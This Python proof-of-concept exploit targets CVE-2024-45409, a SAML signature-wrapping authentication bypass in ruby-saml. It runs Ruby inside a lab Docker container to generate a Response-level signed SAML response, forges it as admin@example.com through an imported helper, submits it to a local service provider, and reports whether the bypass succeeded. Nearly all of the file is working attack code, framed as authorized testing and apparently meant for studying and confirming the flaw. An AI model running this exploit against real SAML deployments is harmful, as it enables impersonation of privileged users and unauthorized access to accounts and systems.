#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : ruby-saml SAML Auth Bypass — Response-Level Signature Attack
# CVE            : CVE-2024-45409
# Vendor         : SAML-Toolkits / OneLogin
# Product        : ruby-saml
# Affected       : 1.13.0 – 1.16.0, <= 1.12.2
# Type           : CWE-347 - Improper Verification of Cryptographic Signature
# CVSS           : 10.0 (Critical)
# Platform       : Any (Ruby / SAML)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2024-09-10
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2024-45409 — Response-Level Signature Attack (Vector 3)

Tests the XSW attack when the original SAML response has the Signature
at the RESPONSE level (not inside the Assertion). Some IdPs sign the
entire <samlp:Response> rather than individual assertions.

The vulnerability is equally exploitable regardless of where the original
Signature resides, because:
  1. The attacker moves the Signature INTO the Assertion anyway
  2. ruby-saml's validate_signed_elements accepts Signature as child of
     either Response or Assertion
  3. The //ds:Reference XPath is document-global regardless

PREREQUISITES:
  - Running CVE-2024-45409 lab container
  - Python 3 with lxml library

REFERENCES:
  - CVE-2024-45409
  - https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2
"""

import hashlib
import os
import subprocess
import sys
import urllib.request
from base64 import b64encode
from datetime import datetime, timedelta, timezone
from uuid import uuid4

try:
    from lxml import etree
except ImportError:
    print("[!] lxml is required: pip install lxml", file=sys.stderr)
    sys.exit(1)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from poc import forge_saml_response, submit_saml_response_raw, log


def generate_response_level_signed(container):
    """
    Generate a SAML response where the Signature is at the Response level
    (NOT inside the Assertion). This is done by modifying the mock IdP's output.

    We generate a response with Assertion-level signature, then use Ruby inside
    the container to re-sign at the Response level.
    """
    log("Generating Response-level signed SAML response")

    # Use a Ruby script inside the container to create a Response-level signed response
    ruby_script = r'''
require 'nokogiri'
require 'openssl'
require 'base64'
require 'securerandom'
require 'time'

DSIG = "http://www.w3.org/2000/09/xmldsig#"
SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"

cert_text = File.read('/app/certs/ruby-saml.crt')
key_text = File.read('/app/certs/ruby-saml.key')
key = OpenSSL::PKey::RSA.new(key_text)
cert_b64 = cert_text.gsub(/-----BEGIN CERTIFICATE-----/, '').gsub(/-----END CERTIFICATE-----/, '').gsub(/\s+/, '')

now = Time.now.utc
not_before = (now - 300).strftime('%Y-%m-%dT%H:%M:%SZ')
not_on_or_after = (now + 3600).strftime('%Y-%m-%dT%H:%M:%SZ')
issue_instant = now.strftime('%Y-%m-%dT%H:%M:%SZ')

response_id = "pfx" + SecureRandom.hex(16)
assertion_id = "pfx" + SecureRandom.hex(16)

# Build Response with unsigned assertion (NO Signature inside Assertion)
response_xml = %Q{<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="#{response_id}" Version="2.0" IssueInstant="#{issue_instant}" Destination="http://localhost:4567/saml/acs">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0" ID="#{assertion_id}" IssueInstant="#{issue_instant}">
    <saml:Issuer>idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@example.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="#{not_on_or_after}" Recipient="http://localhost:4567/saml/acs"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="#{not_before}" NotOnOrAfter="#{not_on_or_after}">
      <saml:AudienceRestriction>
        <saml:Audience>http://sp.example.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="#{issue_instant}" SessionNotOnOrAfter="#{(now + 28800).strftime('%Y-%m-%dT%H:%M:%SZ')}" SessionIndex="#{assertion_id}">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>}

doc = Nokogiri::XML(response_xml) { |c| c.strict.nonet }
assertion = doc.at_xpath('//saml:Assertion', 'saml' => SAML)

# Sign the ASSERTION (compute digest over assertion)
canon_assertion = assertion.canonicalize(Nokogiri::XML::XML_C14N_EXCLUSIVE_1_0)
digest = OpenSSL::Digest::SHA1.digest(canon_assertion)
digest_b64 = Base64.strict_encode64(digest)

# Build SignedInfo referencing the ASSERTION ID
signed_info_xml = %Q{<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/><ds:Reference URI="##{assertion_id}"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/><ds:DigestValue>#{digest_b64}</ds:DigestValue></ds:Reference></ds:SignedInfo>}

signed_info_doc = Nokogiri::XML(signed_info_xml)
canon_signed_info = signed_info_doc.root.canonicalize(Nokogiri::XML::XML_C14N_EXCLUSIVE_1_0)
signature_value = key.sign(OpenSSL::Digest::SHA1.new, canon_signed_info)
sig_b64 = Base64.strict_encode64(signature_value)

# Build Signature and insert at RESPONSE level (after Response Issuer, before Status)
sig_xml = %Q{<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/><ds:Reference URI="##{assertion_id}"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/><ds:DigestValue>#{digest_b64}</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>#{sig_b64}</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>#{cert_b64}</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature>}

# Insert Signature at RESPONSE level (after Response's Issuer)
resp_issuer = doc.root.at_xpath('saml:Issuer', 'saml' => SAML)
sig_fragment = Nokogiri::XML::DocumentFragment.parse(sig_xml)
resp_issuer.add_next_sibling(sig_fragment)

File.write('/app/response_level_signed.xml', doc.to_xml)
$stderr.puts "[IdP-v3] Response-level signed SAML Response generated"
$stderr.puts "  Response ID: #{response_id}"
$stderr.puts "  Assertion ID: #{assertion_id}"
'''

    result = subprocess.run(
        ["docker", "exec", "-i", container, "ruby", "-e", ruby_script],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"Failed to generate Response-level signed response: {result.stderr}")
    log(result.stderr.strip())

    xml = subprocess.check_output(
        ["docker", "exec", container, "cat", "/app/response_level_signed.xml"]
    )
    return xml


def main():
    container = "cve-2024-45409-vulnerable"
    target_host = "localhost"
    target_port = 4567

    print("=" * 70)
    print("  CVE-2024-45409 — Vector 3: Response-Level Signature Attack")
    print("  Testing when the IdP signs at the Response level")
    print("=" * 70)
    print()

    # Step 1: Generate a Response-level signed SAML response
    print("[PHASE 1] Generating Response-level signed SAML response")
    legit_xml = generate_response_level_signed(container)
    print(f"  Response size: {len(legit_xml)} bytes")

    # Verify legitimate response works
    print("[PHASE 1] Verifying legitimate Response-level signed response...")
    status, body = submit_saml_response_raw(target_host, target_port, legit_xml)
    print(f"  HTTP {status}: {body}")
    if status == 200 and '"authenticated"' in body:
        print("  [OK] Response-level signed response accepted")
    else:
        print("  [!] Response-level signed response rejected")
        print("      This may indicate the SP only accepts assertion-level signatures")
        # Still try the attack
    print()

    # Step 2: Forge the response
    print("[PHASE 2] Forging response as admin@example.com")
    try:
        forged_xml = forge_saml_response(legit_xml, "admin@example.com")
    except Exception as e:
        print(f"  [!] Forge failed: {e}")
        sys.exit(1)
    print()

    # Step 3: Submit forged response
    print("[PHASE 3] Submitting forged Response-level attack")
    status, body = submit_saml_response_raw(target_host, target_port, forged_xml)
    print(f"  HTTP {status}: {body}")
    print()

    if status == 200 and '"authenticated"' in body and "admin@example.com" in body:
        print("=" * 70)
        print("  [VULNERABLE] Response-level signature attack CONFIRMED!")
        print("  The attack works regardless of whether the IdP signs")
        print("  at the Response level or Assertion level.")
        print("=" * 70)
        sys.exit(0)
    else:
        print("=" * 70)
        print("  [RESULT] Response-level signature attack did not succeed")
        print(f"  Response: {body}")
        print("=" * 70)
        sys.exit(1)


if __name__ == "__main__":
    main()
